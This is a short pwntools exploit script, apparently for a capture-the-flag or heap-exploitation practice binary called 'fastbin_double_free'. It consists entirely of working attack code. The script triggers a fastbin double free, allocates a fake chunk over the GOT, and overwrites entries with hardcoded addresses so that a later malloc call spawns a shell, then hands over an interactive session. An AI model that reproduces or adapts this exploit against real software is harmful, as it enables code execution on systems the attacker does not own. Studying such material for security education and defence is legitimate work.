from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./fastbin_double_free"
# libc_binary = "./"

p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
# libc = ELF(libc_binary)
context.arch = "amd64"

def cmd(x):
    p.recvuntil("> ")
    p.sendline(x)

def malloc(i,length,s):
    cmd("1 %d %d\n%s" % (i,length,s))

def free(i):
    cmd("2 %d" % i)

malloc_got = elf.got["malloc"]
system_got = elf.got["system"]
system_plt = elf.plt["system"]

malloc(0,0x40-8,"a")
malloc(1,0x40-8,"a")
free(0)
free(1)
free(0)

sh_addr = 0x4007e6
fake_chunk = 0x601022
malloc(2,0x40-8,p64(fake_chunk))
malloc(3,0x40-8,"a")
malloc(4,0x40-8,"a")
malloc(5,0x40-8,"\xa9\xf7"+"\xff\x7f\x00\x00"+p64(0x7ffff7a6ba88)+"sh"+"\x00"*6+p64(sh_addr))
malloc(6,0x601040,"a")

p.interactive()
